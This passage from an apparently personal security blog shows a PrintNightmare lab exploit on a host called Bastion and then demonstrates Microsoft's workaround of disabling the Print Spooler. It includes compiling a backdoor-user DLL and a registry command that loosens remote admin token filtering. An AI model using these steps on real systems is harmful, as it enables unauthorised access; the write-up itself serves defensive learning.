<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span></span></code></pre></div><p>On Bastion, although the exploit successfully evade the AV and the backdoor user was added into the machine, I&rsquo;m unable to login via WinRM. However,  <code>impacket-psexec</code> will do.</p>
<p><div class="img-container"><img src="imgs/image-20210730191657750.png" alt="image-20210730191657750"  /></div>
</p>
<p>Further investigation, I found out that  <code>Invoke-Command</code> from localhost is allowed.</p>
<p><div class="img-container"><img src="imgs/image-20210730192152601.png" alt="image-20210730192152601"  /></div>
</p>
<p>So, I guess the WinRM on Bastion was configured to only allow admin account for remote access. I couldn&rsquo;t get the &ldquo;right&rdquo; keywords to <em>google</em> this. Below are what I&rsquo;ve tried so far:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ winrm get winrm/config
</span></span><span class="line"><span class="cl">$ winrm get winrm/config/listener
</span></span><span class="line"><span class="cl">$ <span class="o">(</span>Get-PSSessionConfiguration -Name Microsoft.PowerShell<span class="o">)</span>.Permission
</span></span><span class="line"><span class="cl">$ HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem
</span></span><span class="line"><span class="cl">$ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="m">1</span> /f
</span></span></code></pre></div><h2 id="mitigation">Mitigation</h2>
<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare:</p>
<ul>
<li>Disable Print Spooler service</li>
<li>Disable inbound remote printing through Group Policy.</li>
</ul>
<p>Also, it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.  I have no idea to work with the second option from CLI, so I will demo the first one.</p>
<h4 id="disable-print-spooler-service">Disable Print Spooler Service</h4>
<p>Based on Microsoft guidance, I need to determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ Stop-Service -Name Spooler -Force
</span></span><span class="line"><span class="cl">$ Set-Service -Name Spooler -StartupType Disabled
</span></span></code></pre></div><p>I will run that on Bastion.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Get-Service -Name Spooler 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  Spooler            Print Spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Stop-Service -Name Spooler -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Set-Service -Name Spooler -StartupType Disabled
</span></span></code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p>
<p><div class="img-container"><img src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  /></div>
</p>
<p>The workaround is worked! But, the downside is that you loss the ability to print from both local and remote 🙃.</p>
<p>For more detailed mitigation, you can go to <a href="https://github.com/LaresLLC/CVE-2021-1675">this GitHub repo</a>.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
